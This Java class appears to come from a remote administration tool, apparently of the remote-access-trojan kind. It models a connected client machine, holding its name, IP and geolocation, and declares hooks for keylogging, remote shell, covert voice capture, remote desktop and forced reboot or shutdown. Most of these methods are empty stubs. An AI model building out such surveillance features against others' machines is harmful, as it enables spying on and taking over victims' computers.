package com.melardev.xeytanj.services.net;

import com.melardev.xeytanj.enums.ProcessInfoDetails;
import com.melardev.xeytanj.maps.ClientGeoStructure;
import com.melardev.xeytanj.models.Client;
import com.melardev.xeytanj.net.packets.PacketType;
import com.melardev.xeytanj.net.packets.voice.PacketVoice;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

public class RemoteClient {

    private ClientContext clientContext;
    private Client client;
    private Set<PacketType> expectedPackets;

    public RemoteClient(ClientContext context, Client client) {
        this.clientContext = context;
        this.client = client;
        expectedPackets = new HashSet<>();
    }

    public Client getClient() {
        return client;
    }

    public UUID getClientId() {
        return getClient().getId();
    }


    public String getPcName() {
        return getClient().getPcName();
    }


    public String getJreVersion() {
        return getClient().getJreVersion();
    }

    public void setJreVersion(String version) {
        getClient().setJreVersion(version);
    }

    public void startFileManager() {
        getNetworkService().startFileManagerSession();
    }

    private INetworkClientService getNetworkService() {
        return getClientContext().getNetClientService();
    }


    public void startListProcess(ProcessInfoDetails level) {

    }



    public void startShellSessionService() {

    }

    public void startKeyLogSession() {
    }

    public ClientContext getClientContext() {
        return clientContext;
    }

    public void setClientContext(ClientContext clientContext) {
        this.clientContext = clientContext;
    }

    public void setNetService(INetworkClientService networkClientService) {
        getClientContext().setNetClientService(networkClientService);
    }

    public void startVoIp(PacketVoice.Mode dataType) {

    }

    public void startRebootSystem() {

    }

    public void startShutDownSystem() {

    }

    public void startLogOffSystem() {
    }

    public void startLockSystem() {
    }

    public void startTurnDisplay(boolean on) {
    }

    public String getOS() {
        return null;
    }

    public String getCity() {
        return null;
    }


    public String getIP() {
        return null;
    }

    // TODO: Remove this Exception
    public void startSession() throws IOException {
        clientContext.getNetClientService().interactAsync();
    }

    public void setOs(String os) {
        client.setOs(os);
    }

    public void setPcName(String pcName) {
        client.setPcName(pcName);
    }

    public void setGlobalIp(String globalIp) {
        client.setGlobalIp(globalIp);
    }


    public void setGeoData(ClientGeoStructure geoData) {
        getClient().setGeoData(geoData);
    }

    public String getCountry() {
        return getClient().getGeoData().getCountry();
    }

    public void setLocalIp(String localIp) {
        client.setLocalIp(localIp);
    }

    public boolean isStreamingDesktop() {
        return getClientContext().getNetClientService().isStreamingDesktop();
    }

    public void pauseRemoteDesktop() {
        getClientContext().getNetClientService().pauseRemoteDesktop();
    }


    public boolean isExpectingPacket(PacketType packetType) {
        return expectedPackets.contains(packetType);
    }

    public void appendExpectedPacket(PacketType packetType) {
        expectedPackets.add(packetType);
    }

    public void removeExpectedPacket(PacketType packetType) {
        expectedPackets.remove(packetType);
    }
}
